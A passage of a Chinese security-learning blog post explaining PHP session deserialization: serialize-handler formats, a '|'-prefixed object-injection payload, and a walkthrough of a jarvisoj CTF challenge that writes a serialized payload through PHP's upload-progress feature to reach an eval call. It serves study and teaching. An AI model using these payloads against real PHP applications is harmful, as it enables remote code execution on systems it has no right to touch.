+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//session_generate.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_binary'</span>);<span class="comment">//通过更换不同的处理器观察session变化</span></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'name'</span>] = <span class="string">'sketch_pl4ne'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>php：</p>
+<p><img src="https://t1.picb.cc/uploads/2019/10/07/gL5C67.png" alt=""></p>
+<p>php_serialize：</p>
+<p><img src="https://t1.picb.cc/uploads/2019/10/07/gL5cO6.png" alt=""></p>
+<p><strong>PS：a:1:{xxxxxx}是默认格式</strong></p>
+<p>php_binary：</p>
+<p><img src="https://t1.picb.cc/uploads/2019/10/07/gL5mPT.png" alt=""></p>
+<p><strong>PS：chr(4)是不可见字符</strong></p>
+<h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//foo1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">'sketch_pl4ne'</span>] = $_GET[<span class="string">'a'</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//foo2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sketch_pl4ne</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $name;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;name = <span class="string">'SP_wants_a_girlfriend.'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'hi! '</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//payload.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sketch_pl4ne</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $name;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;name = <span class="string">'SP_wants_a_girlfriend.'</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'hi! '</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> sketch_pl4ne();</span><br><span class="line">$o-&gt;name = <span class="string">'sketch_pl4ne'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：<code>/foo1.php?a=|O:12:&quot;sketch_pl4ne&quot;:1:{s:4:&quot;name&quot;;s:12:&quot;sketch_pl4ne&quot;;}</code></p>
+<p>访问<code>foo2.php</code>，成功输出<code>hi! sketch_pl4ne</code>。</p>
+<p>查看生成的session文件：</p>
+<p><img src="https://t1.picb.cc/uploads/2019/10/07/gL5GHt.png" alt=""></p>
+<p>可以发现只要我们在需要传入的序列化字符串前加<code>|</code>，那么走<code>foo2.php</code>的<code>php</code>处理器时前面都会被当作session_name，后面构造的序列化字符串自然就被解析了。</p>
+<h3 id="php-session-uoload-progress"><a href="#php-session-uoload-progress" class="headerlink" title="php_session_uoload_progress"></a>php_session_uoload_progress</h3><p>当没有$_SESSION[‘sketch_pl4ne’] = $_GET[‘a’]这么好的条件时该怎么写入payload呢？我们还可以利用php的上传进度报告向session文件中写入构造好的payload (doge)</p>
+<p>这里以jarvisoj中的PHPINFO为例：<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">PHPINFO</a> </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现是个很简单的反序列化，关键是找不到输入点，这里需要利用另外一种触发session反序列化的方式：<strong><em>利用上传进度报告向SESSION文件中写入payload。</em></strong></p>
+<p>我们可以设置一个与session.upload_progress.name同名的变量(默认为PHP_SESSION_UPLOAD_PROGRESS)，PHP检测到这种同名请求会在<code>$_SESSION</code>中添加一条数据。我们就可以控制这个数据内容为我们的恶意payload。</p>
+<p>触发条件：</p>
+<ul>
+<li>session.upload_progress.enabled=On</li>
+<li>session.upload_progress.cleanup=Off</li>
+</ul>
+<p>通过phpinfo()页面可以发现符合条件</p>
+<p>首先构造一个upload.html</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;web.jarvisoj.com:32784&#x2F;index.php&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt; </span><br><span class="line">    &lt;!--value为payload输入点--&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
+
+<p>再根据题目写一个PoC</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> OowoO();</span><br><span class="line">$a-&gt;mdzz = <span class="string">"print_r(scandir('.'));"</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>PS：注意在生成的payload前加<code>|</code>。</p>
+<p>最后flag在一个很诡异的地方= =</p>
+<p><img src="https://t1.picb.cc/uploads/2019/10/07/gL58CJ.png" alt=" "></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>今天得知英语作文超级加倍，唉，我反手点一个不写，闷声发大财~</p>
+<p>明天sql注入总结，冲冲冲！</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web/" rel="tag"># Web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/28/git%E5%AD%A6%E4%B9%A0/" rel="next" title="git学习">
+                <i class="fa fa-chevron-left"></i> git学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/10/08/SQLI%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" rel="prev" title="sqli-labs速刷通关">
+                sqli-labs速刷通关 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="sketch_pl4ne" />
+            
+              <p class="site-author-name" itemprop="name">sketch_pl4ne</p>
+              <p class="site-description motion-element" itemprop="description">wym</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.zhaoj.in/" title="glzjin" target="_blank">glzjin</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://lihuaiqiu.github.io/" title="离怀秋" target="_blank">离怀秋</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/wfzWebSecuity/" title="tr1ple" target="_blank">tr1ple</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://southsea.st/" title="南溟" target="_blank">南溟</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#private成员变量"><span class="nav-number">2.</span> <span class="nav-text">private成员变量</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#小结"><span class="nav-number">2.1.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#protected成员变量"><span class="nav-number">3.</span> <span class="nav-text">protected成员变量</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#小结-1"><span class="nav-number">3.1.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phar反序列化"><span class="nav-number">4.</span> <span class="nav-text">phar反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#原生类利用之-ZipArchive-open"><span class="nav-number">5.</span> <span class="nav-text">原生类利用之 ZipArchive::open()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#原生类利用之-SoapClient-SSRF"><span class="nav-number">6.</span> <span class="nav-text">原生类利用之 SoapClient SSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Session反序列化"><span class="nav-number">7.</span> <span class="nav-text">Session反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#存储机制"><span class="nav-number">7.1.</span> <span class="nav-text">存储机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#存储格式"><span class="nav-number">7.2.</span> <span class="nav-text">存储格式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反序列化漏洞"><span class="nav-number">7.3.</span> <span class="nav-text">反序列化漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-session-uoload-progress"><span class="nav-number">7.4.</span> <span class="nav-text">php_session_uoload_progress</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">8.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">sketch_pl4ne</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">36.8k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three-waves.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
